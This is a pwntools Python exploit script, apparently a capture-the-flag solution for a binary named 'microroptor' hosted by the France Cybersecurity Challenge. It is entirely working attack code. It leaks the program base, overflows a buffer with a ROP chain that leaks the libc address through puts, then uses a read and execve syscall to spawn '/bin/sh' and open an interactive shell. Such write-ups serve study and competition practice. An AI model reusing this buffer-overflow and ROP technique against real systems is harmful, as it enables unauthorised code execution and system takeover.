#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

exe = ELF('./microroptor_patched')
libc = ELF('./libc.so.6')

host, port = "challenges.france-cybersecurity-challenge.fr", "2052"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)


base = int(p.recvuntil('\n',drop=True),16) - 0x4010

gadget1 = base + 0x000000000000116f # pop rdi ; ret
gadget2 = base + 0x0000000000001171 # pop rdx ; ret
gadget3 = base + 0x0000000000001249 # pop rsi ; pop r15 ; ret
gadget4 = base + 0x000000000000114f # pop rbp ; ret
gadget5 = base + 0x00000000000011ec # leave ; ret
gadget6 = base + 0x0000000000001173 # syscall
bss = base + 0x49f8

payload = 'A'*0x28+p64(gadget1)+p64(base+exe.got['printf'])+p64(base+exe.sym['puts'])
payload += p64(gadget1)+p64(0)+p64(gadget3)+p64(bss)+p64(0)+p64(gadget2)+p64(59)+p64(base+exe.sym['read'])
payload += p64(gadget1)+p64(bss)+p64(gadget3)+p64(0)*2+p64(gadget2)+p64(0)+p64(gadget6)
payload = payload.ljust(0x200,'\x00')

p.send(payload)
p.recvuntil('master.\n', drop=True)
libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - libc.sym['printf']
print('libc base = '+hex(libc.address))

bss = base + 0x49f0

payload2 = b'/bin/sh'.ljust(59,'\x00')
p.send(payload2)

p.interactive()

